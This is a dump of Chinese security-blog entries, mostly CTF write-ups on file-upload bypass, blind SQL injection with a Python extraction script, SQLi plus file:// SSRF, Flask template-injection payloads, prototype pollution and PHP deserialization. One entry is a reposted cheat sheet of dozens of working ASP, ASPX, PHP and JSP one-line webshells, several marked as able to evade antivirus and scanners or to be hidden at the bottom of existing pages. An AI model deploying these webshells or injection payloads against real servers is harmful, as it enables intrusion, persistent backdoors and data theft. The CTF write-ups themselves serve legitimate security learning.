\n因此可以将id赋值为1a9\n\n页面有所回显，此刻我们便可以进行文件上传，上传时先来看看如何绕过正则，结合题目信息，这里说是有文件解析漏洞，那我们应当找一下该项目是由哪个中间件写的\n\n这就好办了。\nApache解析漏洞\n原理： Apache 解析文件的规则是从右到左开始判断解析，如果后缀名为不可识别文件解析，就再往左判断。比如test.php.a.b的“.a”和“.b”这两种后缀是apache不能识别解析，apache就会把test.php.a.b解析成test.php。\n\n上传成功以后，页面并不会有任何回显，需要输入$con的上传网址查看自己的文件\n\n但似乎这里并没有被当做php解析，蚁剑连接不上去，看了wp发现payload如下\ncon=&lt;?php @eval($_POST[1]);?&gt;&amp;file=shell.php/.\n\n这回成功解析为php，蚁剑也成功连接\n\n拿到flag\n\n总结\nphp的解释器可以解析：php、php3、php4、php5、php7、phtml、pht、phs、shtml、pwml，不过本题都对此过滤了。\n\n也有大佬根据apache2.x的解析漏洞，补充了不可识别的文件格式~例如1.php.1（有大佬以截断形式输入，1.php/.，上传后显示为1.php）\n绕过方式`../filename.php/.`或者`filename.php/.`绕过原理:文件名中不允许带有/ 因为/表示目录的分割符 在php中，如果保存的文件中含有/ 会自动省略/后面的内容，/后面的.是为了达到匹配最后一个.的效果\n参考文章：\nwp参考一\nwp参考二\nwp参考三\n","categories":["攻防世界"]},{"title":"攻防世界-unfinish","url":"/2023/08/24/unfinish/","content":"题目描述：\nSQL\n题目解题：\n\n进入页面发现没啥信息，邮箱也必须符合正常格式，源代码也没用，因此就用dirsearch扫了一下，发现个register.php页面，此刻我就想到可能存在二次注入，毕竟就这俩页面。其次，大家也可以用awvs扫一下，也可以扫出来\n\n确定是注入后，就是寻找注入点了，这里输入正常的注册内容抓包看一下\n\n结合下图的页面发现会回显用户名，那基本注入点就在用户名了\n用户名注册时加个单引号注册失败，双引号注册成功，说明可能为单引号闭合·，\n\n随后就是对用户名过滤字符的fuzz了\n\n可以看到这有这四个没有过滤，接着就开始借鉴wp了\n看了看大佬的wp，翻译一下，就是通过使用0’+1+'0作为用户名，在注册的时候，猜想使用sql语句插入到表中，如：\ninsert into tables values(&#x27;$email&#x27;,&#x27;$username&#x27;,&#x27;$password&#x27;)\n在插入中将0’+1+‘0插入，取的时候，MySQL语言的一种特性，就是+在MySQL中是作为运算符的，引用一幅图：\n\n如果加号运算中有字符，那么mysql就会把字符转变为数字在相加，比如select ‘1’+‘1a’;结果为2，转换过程跟php类似。\n下面是几个例子：\nmysql&gt; select &#x27;1&#x27;+&#x27;1a&#x27;;+----------+| &#x27;1&#x27;+&#x27;1a&#x27; |+----------+|        2 |+----------+1 row in set, 1 warning (0.00 sec)mysql&gt; select &#x27;0&#x27;+database();+----------------+| &#x27;0&#x27;+database() |+----------------+|              0 |+----------------+1 row in set (0.00 sec)\n可以用截取的方法，截取处每一位，然后ascii编码。\nmysql&gt; select &#x27;0&#x27;+ascii(substr(database(),1,1));+-----------------------------------+| &#x27;0&#x27;+ascii(substr(database(),1,1)) |+-----------------------------------+|                               100 |+-----------------------------------+1 row in set (0.00 sec)mysql&gt; select &#x27;0&#x27;+ascii(substr(database(),2,1));+-----------------------------------+| &#x27;0&#x27;+ascii(substr(database(),2,1)) |+-----------------------------------+|                               118 |+-----------------------------------+1 row in set (0.00 sec)\n成功截取，但是逗号被过滤，该咋办。使用from...for...代替。\nmysql&gt; select &#x27;0&#x27;+ascii(substr(database() from 1 for 1));+--------------------------------------------+| &#x27;0&#x27;+ascii(substr(database() from 1 for 1)) |+--------------------------------------------+|                                        100 |+--------------------------------------------+1 row in set (0.00 sec)mysql&gt; select &#x27;0&#x27;+ascii(substr((database()) from 2 for 1));+----------------------------------------------+| &#x27;0&#x27;+ascii(substr((database()) from 2 for 1)) |+----------------------------------------------+|                                          118 |+----------------------------------------------+1 row in set (0.00 sec)\n还有可以使用十六进制转换后运算\n有疑问，为啥不用二进制或者八进制。用例子来说明：\nmysql&gt; select bin(&#x27;dvwa&#x27;);+-------------+| bin(&#x27;dvwa&#x27;) |+-------------+| 0           |+-------------+1 row in set (0.00 sec)mysql&gt; select oct(&#x27;dvwa&#x27;);+-------------+| oct(&#x27;dvwa&#x27;) |+-------------+| 0           |+-------------+1 row in set (0.00 sec)mysql&gt; select hex(&#x27;dvwa&#x27;);+-------------+| hex(&#x27;dvwa&#x27;) |+-------------+| 64767761    |+-------------+1 row in set (0.00 sec)\n可以看到，只有十六进制成功转换。\n但是又出来一个问题，如果十六进制转换后的字符串有字母的话，转化为数字后相加就会丢失字符。\n又但是当这个长字符串转成数字型数据的时候会变成科学计数法，也就是说会丢失数据精度。\n这里还可以使用分段读法。\nmysql&gt; select substr(hex(hex(&#x27;dvwa&#123;&#125;&#x27;)) from 1 for 10)+&#x27;0&#x27;;+----------------------------------------------+| substr(hex(hex(&#x27;dvwa&#123;&#125;&#x27;)) from 1 for 10)+&#x27;0&#x27; |+----------------------------------------------+|                                   3634373637 |+----------------------------------------------+1 row in set (0.00 sec)mysql&gt; select substr(hex(hex(&#x27;dvwa&#123;&#125;&#x27;)) from 11 for 10)+&#x27;0&#x27;;+-----------------------------------------------+| substr(hex(hex(&#x27;dvwa&#123;&#125;&#x27;)) from 11 for 10)+&#x27;0&#x27; |+-----------------------------------------------+|                                    3736313742 |+-----------------------------------------------+1 row in set (0.00 sec)mysql&gt; select substr(hex(hex(&#x27;dvwa&#123;&#125;&#x27;)) from 21 for 10)+&#x27;0&#x27;;+-----------------------------------------------+| substr(hex(hex(&#x27;dvwa&#123;&#125;&#x27;)) from 21 for 10)+&#x27;0&#x27; |+-----------------------------------------------+|                                          3744 |+-----------------------------------------------+1 row in set (0.00 sec)mysql&gt; select unhex(unhex(363437363737363137423744));+----------------------------------------+| unhex(unhex(363437363737363137423744)) |+----------------------------------------+| dvwa&#123;&#125;                                 |+----------------------------------------+1 row in set (0.11 sec)\n抄大佬的脚本\nimport requests  #导入 requests 模块，用于进行 HTTP 请求。import re\t# 导入 re 模块，用于使用正则表达式进行字符串匹配。register_url = &#x27;http://61.147.171.105:49466/register.php&#x27;login_url = &#x27;http://61.147.171.105:49466/login.php&#x27;for i in range(1, 100):    register_data = &#123;# 构建注册的相关数据        &#x27;email&#x27;: &#x27;111@123.com%d&#x27; % i,        &#x27;username&#x27;: &quot;0&#x27; + ascii(substr((select * from flag) from %d for 1)) + &#x27;0&quot; % i,        &#x27;password&#x27;: &#x27;admin&#x27;    &#125;    res = requests.post(url=register_url, data=register_data)#requests.post() 发送注册请求，并将结果保存在res中。    login_data = &#123;        &#x27;email&#x27;: &#x27;111@123.com%d&#x27; % i,        &#x27;password&#x27;: &#x27;admin&#x27;    &#125;    res_ = requests.post(url=login_url, data=login_data)#requests.post() 发送登录请求，并将结果保存在 res_ 中。    # 使用正则表达式搜索 res_.text 中的 &lt;span class=&quot;user-name&quot;&gt;数字&lt;/span&gt; 的模式，提取其中的数字部分。这个数字可能是从数据库中提取的信息的一部分。    code = re.search(r&#x27;&lt;span class=&quot;user-name&quot;&gt;\\s*(\\d*)\\s*&lt;/span&gt;&#x27;, res_.text)    print(chr(int(code.group(1))), end=&#x27;&#x27;)\n\n对代码中的group的研究：\n正则\nimport rea = &quot;123abc456&quot;print re.search(&quot;([0-9]*)([a-z]*)([0-9]*)&quot;,a).group(0)   #123abc456,返回整体print re.search(&quot;([0-9]*)([a-z]*)([0-9]*)&quot;,a).group(1)   #123print re.search(&quot;([0-9]*)([a-z]*)([0-9]*)&quot;,a).group(2)   #abcprint re.search(&quot;([0-9]*)([a-z]*)([0-9]*)&quot;,a).group(3)   #456\n究其因\n1. 正则表达式中的三组括号把匹配结果分成三组- group() 同group（0）就是匹配正则表达式整体结果- group(1) 列出第一个括号匹配部分，group(2) 列出第二个括号匹配部分，group(3) 列出第三个括号匹配部分。2. 没有匹配成功的，re.search（）返回None3. 当然郑则表达式中没有括号，group(1)肯定不对了*表示0次或多次\\r表示匹配原生字符串，如\\就仅表示\\，但是*和?之类就要加\\才能表示字符本身\n参考文章：\nxctf攻防世界 Web高手进阶区\nunfinish\n攻防世界web进阶区unfinish详解\n","categories":["攻防世界"]},{"title":"攻防世界-fakebook","url":"/2023/08/18/fakebook/","content":"题目描述：\n无\n题目解题：\n进入页面\n\n这里先login看看\n\n老规矩先试试弱口令，测试一番没啥用，那就换思路，随便注册一个看看\n\n\n这里也是注册了三个，以便测试，点击每个页面看看\n\n感觉没啥利用的点，于是回到最初我们先扫一下网站\n\n看到了flag.php，我还以为是真的，结果没啥用，那看看robots.txt\n\n那我们访问之后发现了一份源码如下\n&lt;?phpclass UserInfo&#123;    public $name = &quot;&quot;;    public $age = 0;    public $blog = &quot;&quot;;    public function __construct($name, $age, $blog) //接受用户join的相关信息    &#123;        $this-&gt;name = $name;        $this-&gt;age = (int)$age;        $this-&gt;blog = $blog;    &#125;    function get($url) //主要是返回用户所输入的博客内容    &#123;        $ch = curl_init();        curl_setopt($ch, CURLOPT_URL, $url);        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);        $output = curl_exec($ch);        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);        if($httpCode == 404) &#123;            return 404;        &#125;        curl_close($ch);        return $output;    &#125;    public function getBlogContents () //调用get函数    &#123;        return $this-&gt;get($this-&gt;blog);    &#125;    public function isValidBlog ()//利用正则判断博客格式是否正确，这里呢只需要.分隔开就可以    &#123;        $blog = $this-&gt;blog;        return preg_match(&quot;/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i&quot;, $blog);    &#125;&#125;\n这里感觉有点模糊，没啥利用的点，返回页面看到url上有no参数，想到了sql，尝试一下\n\n可以看到报错，说明的确存在，那我们就先手动测试一番\n\n这里发现有四列\n\n接着想查看数据库名\n\n不出所料过滤了。。。。\n那先手动fuzz，这里不出所料就是union select的过滤了，尝试一下双写，大小写，注释符看看\n\n测试发现过滤的是“union select”这个字符串\n\n这里发现第二列是回显位\n接着看一下当前数据库名称与用户\n\n\n这里常规说继续看表名列名来找flag，不过看了wp发现，这里又root身份，权限很高，那么可以利用mysql中的load_file函数。\n允许访问系统文件，并将内容以字符串形式返回，不过需要的权限很高，且函数参数要求文件的绝对路径。//这巧了不是，条件全都有。\nview.php?no=-3 union/**/select 1,load_file(&quot;/var/www/html/flag.php&quot;),3,4#\n\n找到flag。\n接下来接着按常规思路看看\n?no=-3 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=&quot;fakebook&quot;#                      //爆表名\n\n?no=-3 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&quot;users&quot;#                      //爆列名\n\n在这里data字段最可疑\n?no=-3 union/**/select 1,group_concat(username,data),3,4 from users#                      \n\n如图发现序列化字符串\n接下来就不太会了，跟着wp走\n接下来的东西，我认为需要猜。最开始时的用户页面no=1时，页面返回用户的用户名、密码、博客之类的消息。毫无疑问，页面是根据users表中no=1的这条数据，渲染的页面。因为回显，我们只证明了查询语句的第二个字段是username。其余三个字段并不明确，但我们可以猜测，应该和数据库表中的字段顺序相似。第四个字段应该就是data，而我们现在有一个现成的data数据，能否模拟下？\n?no=-3 union/**/select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:8:&quot;123.blog&quot;;&#125;&#x27;\n\n发现成功回显，并且这似乎是新建的，因为此前我并没有这一项数据，在看wp：\n​\t\t注意no现在的值为2，我们知道这个用户是不存在的。换而言之，原SQL语句的查询结果为空，而我们通过union加入了我们构造的查询语句，让SQL语句有了查询结果，并且此查询结果符合页面渲染要求，所以页面正常显示了。\n大佬就是强，这思路很顶！！！\n​\t\t并且由此得知，只要有data字段的对象序列，就可以成功渲染页面，其他字段并不是很重要。（页面中age和blog的值，显然也都是从序列化的对象里面得到的），接下来就是让我迷的点，你修改对象序列里面的blog参数内容：\ns:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;\n​\t\t用file伪协议读取flag内容交给blog参数，然后你再查看源码，iframe的src就发生了变化：\n\n\n找到flag\n接下来在看佬的思路：\n回想刚刚的问题，如何想到的修改序列里面的blog参数呢？最开始blog参数值为123.blog，源码里iframe的src并没有什么变化。个人认为，如果靶场想启发用户修改blog参数值，应当在blog值被修改后，源码里的src适当变化下，让用户知道，这个点可以使用。无论怎样换blog参数，src没有任何变化，就很难想到再跟进一步的利用伪协议去读取内容了。当然，如果怪没有提示，也并不准确，因为有个点，我们还没用到。详细看最开始我们得到的备份文件：\n\ngetBlogContent函数，我们猜也是个获取blog内容的函数。而其内部调用了我们一开始就说有问题的get函数，接受一个url，并将指定url的内容返回。换而言之，只要blog参数是可以请求到内容，返回不为404的，getBlogContents函数即有返回结果。毫无疑问，伪协议file就能达到要求。那我们换个链接请求下呗：?no=-3%20union/**/select%201,2,3,%27O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:26:&quot;http://111.198.29.45:34016&quot;;&#125;%27\n就换成靶场最开始的主页。\n查看源码：\n\n这个图片没复现出来,不知为何,就先看个思路。\n果不其然，将其base64转码，应该就能得到主页的源码了。\n所以致此，我们可以总结下来。getBlogContents函数调用get函数，把unserinfo类中的blog参数当做一个URL，得到请求内容。而页面里iframe里的src根据得到的内容进行页面渲染。\n正确的思路流程应当为，得到备份文件，明确getBlogContents函数通过一个URL获取内容，并且URL由类实例化对象的blog参数提供。然后在构造userinfo对象序列化发现页面可以正常返回之后，就尝试修改序列化中的blog参数，发现页面中iframe的src暴露信息，进而想到可以使用伪协议读取flag，并让src显示。\n其实，在构造blog的时候，报错信息也一直在给予提示：\n思路很顶，学到了\n参考文章：\n文章参考\n","categories":["攻防世界"]},{"title":"一句话木马大全","url":"/2023/08/23/web%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/","content":"转载请注明出处：https://blog.csdn.net/l1028386804/article/details/84206143\n&lt;%eval request(&quot;c&quot;)%&gt;&lt;%execute request(&quot;c&quot;)%&gt;&lt;%execute(request(&quot;c&quot;))%&gt;&lt;%ExecuteGlobal request(&quot;sb&quot;)%&gt;%&gt;&lt;%Eval(Request(chr(35)))%&gt;&lt;%&lt;%if request (&quot;c&quot;)&lt;&gt;&quot;&quot;then session(&quot;c&quot;)=request(&quot;c&quot;):end if:if session(&quot;c&quot;)&lt;&gt;&quot;&quot; then execute session(&quot;c&quot;)%&gt;&lt;%eval(Request.Item[&quot;c&quot;],&quot;unsafe&quot;);%&gt;&#x27;备份专用&lt;%eval(request(&quot;c&quot;)):response.end%&gt;&#x27;无防下载表,有防下载表突破专用一句话&lt;%execute request(&quot;c&quot;)%&gt;&lt;%&lt;%loop&lt;%:%&gt;&lt;%&lt;%loop&lt;%:%&gt;&lt;%execute request(&quot;c&quot;)%&gt;&lt;%execute request(&quot;c&quot;)&lt;%loop&lt;%:%&gt;&#x27;防杀防扫专用&lt;%if Request(&quot;c&quot;)&lt;&gt;&quot;&quot; ThenExecuteGlobal(Request(&quot;c&quot;))%&gt;&#x27;不用&quot;&lt;,&gt;&quot;&lt;script language=VBScript runat=server&gt;execute request(&quot;c&quot;)&lt;/script&gt;&lt;% @Language=&quot;JavaScript&quot; CodePage=&quot;65001&quot;var lcx=&#123;&#x27;名字&#x27;:Request.form(&#x27;#&#x27;),&#x27;性别&#x27;:eval,&#x27;年龄&#x27;:&#x27;18&#x27;,&#x27;昵称&#x27;:&#x27;请叫我一声老大&#x27;&#125;;lcx.性别((lcx.名字)+&#x27;&#x27;) %&gt;&lt;script language=vbs runat=server&gt;eval(request(&quot;c&quot;))&lt;/script&gt;&lt;script language=vbs runat=server&gt;eval_r(request(&quot;c&quot;))&lt;/script&gt;&#x27;不用双引号&lt;%eval request(chr(35))%&gt;&#x27;可以躲过雷客图&lt;%set ms = server.CreateObject(&quot;MSScriptControl.ScriptControl.1&quot;) ms.Language=&quot;VBScript&quot; ms.AddObject&quot;response&quot;,response ms.AddObject &quot;request&quot;,request ms.ExecuteStatement(&quot;ev&quot;&amp;&quot;al(request(&quot;&quot;c&quot;&quot;))&quot;)%&gt;&lt;%dy=request(&quot;dy&quot;)%&gt;&lt;%Eval(dy)%&gt;&#x27;容错代码if Request(&quot;sb&quot;)&lt;&gt;&quot;&quot; then ExecuteGlobal request(&quot;sb&quot;) end ifPHP一句话&lt;?php eval($_POST1);?&gt;&lt;?php if(isset($_POST[&#x27;c&#x27;]))&#123;eval($_POST[&#x27;c&#x27;]);&#125;?&gt;&lt;?php system($_REQUEST1);?&gt;&lt;?php ($_=@$_GET1).@$_($_POST1)?&gt;&lt;?php eval_r($_POST1)?&gt;&lt;?php @eval_r($_POST1)?&gt;//容错代码&lt;?php assert($_POST1);?&gt;//使用Lanker一句话客户端的专家模式执行相关的PHP语句&lt;?$_POST[&#x27;c&#x27;]($_POST[&#x27;cc&#x27;]);?&gt;&lt;?$_POST[&#x27;c&#x27;]($_POST[&#x27;cc&#x27;],$_POST[&#x27;cc&#x27;])?&gt;&lt;?php @preg_replace(&quot;/[email]/e&quot;,$_POST[&#x27;h&#x27;],&quot;error&quot;);?&gt;/*使用这个后,使用菜刀一句话客户端在配置连接的时候在&quot;配置&quot;一栏输入*/:&lt;O&gt;h=@eval_r($_POST1);&lt;/O&gt;&lt;?php echo `$_GET[&#x27;r&#x27;]` ?&gt;//绕过&lt;?限制的一句话&lt;script language=&quot;php&quot;&gt;@eval_r($_POST[sb])&lt;/script&gt;//绕过&lt;?php ?&gt;限制的一句话 &lt;?=eval($_POST[&#x27;cmd&#x27;]);JSP一句话&lt;%if(request.getParameter(&quot;f&quot;)!=null)(newjava.io.FileOutputStream (application.getRealPath(&quot;\\\\&quot;)+request.getParameter(&quot;f&quot;))).write (request.getParameter(&quot;t&quot;).getBytes());%&gt;提交客户端&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;textareaname=&quot;t&quot;&gt;&lt;/textarea&gt;&lt;br/&gt;&lt;input type=&quot;submit&quot;value=&quot;提交&quot;&gt;&lt;/form&gt;ASPX一句话&lt;script language=&quot;C#&quot;runat=&quot;server&quot;&gt;WebAdmin2Y.x.y a=new WebAdmin2Y.x.y(&quot;add6bb58e139be10&quot;)&lt;/script&gt;普通的php一句话：&lt;?php @eval($_POST[&#x27;r00ts&#x27;]);?&gt;普通的asp一句话：&lt;%eval(Request.Item[&quot;r00ts&quot;],”unsafe”);%&gt;aspx突破一流的：dim daset fso=server.createobject(&quot;scripting.filesystemobject&quot;)path=request(&quot;path&quot;)if path&lt;&gt;&quot;&quot; thendata=request(&quot;da&quot;)set da=fso.createtextfile(path,true)da.write dataif err=0 thenResponse.Write &quot;yes&quot;elseResponse.Write &quot;no&quot;end iferr.clearend ifset da=nothingset fos=nothingResponse.Write &quot;&lt;form action=&quot; method=post&gt;&quot;Response.Write &quot;&lt;input type=text name=path&gt;&quot;Response.Write &quot;&lt;br&gt;&quot;Response.Write &quot;当前文件路径:&quot;&amp;server.mappath(request.servervariables(&quot;script_name&quot;))Response.Write &quot;&lt;br&gt;&quot;Response.Write &quot;操作系统为:&quot;&amp;Request.ServerVariables(&quot;OS&quot;)Response.Write &quot;&lt;br&gt;&quot;Response.Write &quot;WEB服务器版本为:&quot;&amp;Request.ServerVariables(&quot;SERVER_SOFTWARE&quot;)Response.Write &quot;&lt;br&gt;&quot;Response.Write &quot;&lt;textarea name=da cols=50 rows=10 width=30&gt;&lt;/textarea&gt;&quot;Response.Write &quot;&lt;br&gt;&quot;Response.Write &quot;&lt;input type=submit value=save&gt;&quot;Response.Write &quot;&lt;/form&gt;&quot;&lt;/Script&gt;ASP一句话:&lt;%IfRequest(“1″)&lt;&gt;”&quot;ThenExecuteGlobal(Request(“1″))%&gt;PHP防杀放扫 一句话：&lt;?php (])?&gt;上面这句是防杀防扫的！网上很少人用！可以插在网页任何ASP文件的最底部不会出错，比如index.asp里面也是可以的！因为加了判断！加了判断的PHP一句话，与上面的ASP一句话相同道理，也是可以插在任何PHP文件的最底部不会出错！&lt;?if(isset($_POST[&#x27;1&#x27;]))&#123;eval($_POST[&#x27;1&#x27;]);&#125;?&gt;&lt;?php system($_REQUEST[1]);?&gt;无防下载表，有防下载表可尝试插入以下语句突破的一句话&lt;%execute request(“class”)%&gt;&lt;%&#x27;&lt;% loop &lt;%:%&gt;&lt;%&#x27;&lt;% loop &lt;%:%&gt;&lt;%execute request(“class”)%&gt;&lt;%execute request(“class”)&#x27;&lt;% loop &lt;%:%&gt;  备份专用&lt;%eval(request(“1″)):response.end%&gt;asp一句话&lt;%execute(request(“1″))%&gt;aspx一句话:&lt;scriptrunat=”server”&gt;WebAdmin2Y.x.y aaaaa =newWebAdmin2Y.x.y(“add6bb58e139be10″);&lt;/script&gt; 可以躲过雷客图的一句话。&lt;%set ms = server.CreateObject(“MSScriptControl.ScriptControl.1″)ms.Language=”VBScript”ms.AddObject”Response”,Responsems.AddObject”request”,requestms.ExecuteStatement(“ev”&amp;”al(request(“”1″”))”)%&gt; 不用&#x27;&lt;,&gt;‘的asp一句话&lt;scriptrunat=server&gt;execute request(“1″)&lt;/script&gt;不用双引号的一句话。&lt;%eval request(chr(35))%&gt;","categories":["web技巧总结"],"tags":["基本知识"]},{"title":"攻防世界-shrine","url":"/2023/08/18/shrine/","content":"题目描述：\n无\n题目解题：\n\n直接访问发现python的一种模板框架代码，复制进idea看看，进行代码审计\nimport flaskimport os    # 导包app = flask.Flask(__name__)  #创建 Flask 应用app.config[&#x27;FLAG&#x27;] = os.environ.pop(&#x27;FLAG&#x27;)   # 获取环境变量flag@app.route(&#x27;/&#x27;)  # 设置当前目录的路由，会读取当前文件的内容并返回。def index():    return open(__file__).read()@app.route(&#x27;/shrine/&#x27;)   # 匹配 &#x27;/shrine/&#x27; 路径def shrine(shrine):    def safe_jinja(s):        s = s.replace(&#x27;(&#x27;, &#x27;&#x27;).replace(&#x27;)&#x27;, &#x27;&#x27;)          blacklist = [&#x27;config&#x27;, &#x27;self&#x27;]  # 这里对用户的输入过滤了config，self，以及两个括号        return &#x27;&#x27;.join([&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;.format(c) for c in blacklist]) + s    return flask.render_template_string(safe_jinja(shrine))if __name__ == &#x27;__main__&#x27;:    app.run(debug=True)\n那我们先访问一下shrine路由\n\n没啥特殊的，那结合源代码中的render渲染函数我们直接在url后面加点东西看看\n\n\n可以发现，存在ssti注入漏洞，由于这里flag在全局中，找一些合适payload即可\n&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config.FLAG&#125;&#125;&#123;&#123;get_flashed_messages.__globals__[&#x27;current_app&#x27;].config.FLAG&#125;&#125;\n翻了翻仓库发现上述两个均可以获取到配置信息\n\n拿到flag\n","categories":["攻防世界"]},{"title":"攻防世界-wife_wife","url":"/2023/08/23/wife_wife/","content":"题目描述：\ncat-wifi\n本题不需要爆破\n题目解题：\n\n打开是一个登录页面，先测试弱口令，没用，于是扫网站的同时，看看会不会是sql，测试一番啥也没有，源代码也没信息，那就看看注册页面\n\n这里也没啥利用的，就是有个is admin的按钮，输入有效邀请码才能进入，这思路很明显，就是以管理员的身份登录进去肯定就能得到flag。唉，我也就分析到这儿了，同时抓包看了看\n\n发现是个json数据格式，但没啥思路无从下手，还是靠wp度日吧。。。\n看了wp发现是原型链污染。。。虽然说做过类似的题，但并不擅长\n原型链污染\n原型链污染参考\n造成这个漏洞的有一个很重要的前提，这题目的后端是node.js来写的，也就是说后端不是php服务器，不是java服务器，而是JavaScript服务器\n因为是JavaScript语言来处理后端+用JavaScript的那个函数来处理，所以才有这个漏洞产生\n如下代码，prototype是newClass类的一个属性。newClass 实例化的对象 newObj 的 .proto 指向 newClass 类的 prototype\nfunction newClass() &#123;this.test = 1;&#125;var newObj = new newClass();\nJSON 解析的情况下，proto 会被认为是一个真正的“键名”，而不代表“原型”。如果是let o2 = {a: 1, “proto”: {b: 2}}则__proto__会被认为是o2的原型。如果作为键名（不会被解析）就会作为子类的原型\nlet o1 = &#123;&#125;\nlet o2 = JSON.parse('&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;')\nmerge(o1, o2)\nconsole.log(o1.a, o1.b)o3 = &#123;&#125;\nconsole.log(o3.b)\n\nmerge用于合并对象\nmerge 操作是最常见可能控制键名的操作，也最能被原型链攻击，很多常见的库都存在这个问题。\n看一下实例：\nbaseUser = &#123;    a:1&#125;user = &#123;    a:2,    b:1,    __proto__:&#123;        c:3    &#125;&#125; // 这个函数的作用：浅复制一个对象，第一个参数位是对象的内容，后面的参数位是多个对象内容叠加进去，进行复制出一个全新的对象let newUser = Object.assign(&#123;&#125;, baseUser, user)  // 无污染，结果正常console.log(newUser)  // &#123;a: 2, b: 1&#125;  // 无污染，结果正常console.log(newUser.__proto__)  // &#123;constructor: ƒ, __defineGetter__: ƒ, __defineSetter__: ƒ, hasOwnProperty: ƒ, __lookupGetter__: ƒ, …&#125;\n可问题是，后端服务器是JavaScript，我们通过post发送过去的 json是字符串，JavaScript需要通过JSON.parse()函数才能把 json字符串转成对象\nbaseUser = &#123;    a:1&#125; // 这次使用函数把json字符串转成对象，就出问题了，user = JSON.parse(&#x27;  &#123;&quot;a&quot; : 2 , &quot;b&quot; : 3 , &quot;__proto__&quot; : &#123; &quot;c&quot; : 4 &#125;&#125;  &#x27;)// 这个函数的作用：浅复制一个对象，第一个参数位是对象的内容，后面的参数位是多个对象内容叠加进去，进行复制出一个全新的对象let newUser = Object.assign(&#123;&#125;, baseUser, user)  console.log(newUser)  // &#123;a: 2, b: 1&#125;  ，__proto__是隐藏属性，是不会直接显示的console.log(newUser.__proto__) // &#123;c: 4&#125;  ，但是一打印就出来了console.log(newUser.c) // 4  ，已经被污染了，这个属性是一直存在的\n题目源码\n跟着wp学学源码\n// post请求的路径app.post(&#x27;/register&#x27;, (req, res) =&gt; &#123;     let user = JSON.parse(req.body)  // 把我们输入的账号密码，从json字符串转成对象     // 判断我们有没有输入账号和密码    if (!user.username || !user.password) &#123;          return res.json(&#123; msg: &#x27;empty username or password&#x27;, err: true &#125;)    &#125;    // 判断账号是否存在总对象的username里，如果相同的username就是重复用户名了    if (users.filter(u =&gt; u.username == user.username).length) &#123;          return res.json(&#123; msg: &#x27;username already exists&#x27;, err: true &#125;)    &#125;    // isAdmin是否true 与 邀请码是不是等于这个常量，所以sql注入没用，邀请码是个常量    if (user.isAdmin &amp;&amp; user.inviteCode != INVITE_CODE) &#123;        user.isAdmin = false        return res.json(&#123; msg: &#x27;invalid invite code&#x27;, err: true &#125;)    &#125;     // 使用系统函数复制对象，打包成一个新的对象    let newUser = Object.assign(&#123;&#125;, baseUser, user)    users.push(newUser)  // 存到总对象里    res.json(&#123; msg: &#x27;user created successfully&#x27;, err: false &#125;)  // 设置返回信息&#125;)\n看了这部分源码能判断出，如果这个登陆的对象里，isAdmin的属性是true，那就证明是一个管理员，如果是普通注册的用户，isAdmin属性是false，那我们直接修改user原型的属性的值，那么该类的属性的值也就随着变了，payload如下\n&#123;&quot;username&quot;:&quot;bcx&quot;,&quot;password&quot;:&quot;123&quot;,&quot;__proto__&quot;:&#123;&quot;isAdmin&quot;:true&#125;&#125;\n\n成功拿到flag\n\n不过看了很多文章也没人说明是如何发现原型链的，看来应该是佬们做题多了的直觉吧。。。，不过倒是可以靠如下的插件看到这里用的是node.js语言，并且也没有数据库。\n\n参考文章：\nwp参考一\nwp参考二\n","categories":["攻防世界"]},{"title":"内部竞赛3","url":"/2023/08/19/%E5%86%85%E9%83%A8%E7%AB%9E%E8%B5%9B%E9%A2%983/","content":"web1\n &lt;?phphighlight_file(__FILE__);error_reporting(0);class SYCLOVER &#123;    public $syc;    public $lover;    public function __wakeup()&#123;                if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) )&#123;            if(!preg_match(&quot;/\\&lt;\\?php|\\(|\\)|\\&quot;|\\&#x27;/&quot;, $this-&gt;syc, $match))&#123;                eval($this-&gt;syc);            &#125; else &#123;                die(&quot;Try Hard !!&quot;);            &#125;        &#125;    &#125;&#125;//只有36d的人才能看到flagif(intval(strrev($_GET[&#x27;c&#x27;]))==0x36d)&#123;    if (isset($_GET[&#x27;great&#x27;]))&#123;        unserialize($_GET[&#x27;great&#x27;]);    &#125; else &#123;        die(&#x27;error&#x27;);    &#125;&#125;else &#123;    echo &#x27;hacker!!!&#x27;;&#125;?&gt; hacker!!!\n反序列化前有个简单的特性，我们输入778反转后是877也就是0x36d的十进制，由于弱比较的类型转化，就能绕过。\n接着看魔术方法，这里要求其变量不能相等，但经过md5加密与sha1加密之后要分别相等，相信大多数人觉得数组绕过就行了，但当你走到eval发现没办法了，这时候就涨知识了，用到了php的原生类：Exception类\n在此类中：\n- `Exception::__construct` — 异常构造函数- `Exception::getMessage` — 获取异常消息内容- `Exception::getPrevious` — 返回异常链中的前一个异常- `Exception::getCode` — 获取异常代码- `Exception::getFile` — 创建异常时的程序文件名称- `Exception::getLine` — 获取创建的异常所在文件中的行号- `Exception::getTrace` — 获取异常追踪信息- `Exception::getTraceAsString` — 获取字符串类型的异常追踪信息- `Exception::__toString` — 将异常对象转换为字符串- `Exception::__clone` — 异常克隆\n可以看到自带tostring方法，这个方法用于将异常或错误对象转换为字符串。\n&lt;?php$a = new Exception(&quot;payload&quot;,1);$b = new Exception(&quot;payload&quot;,2);echo $a;echo 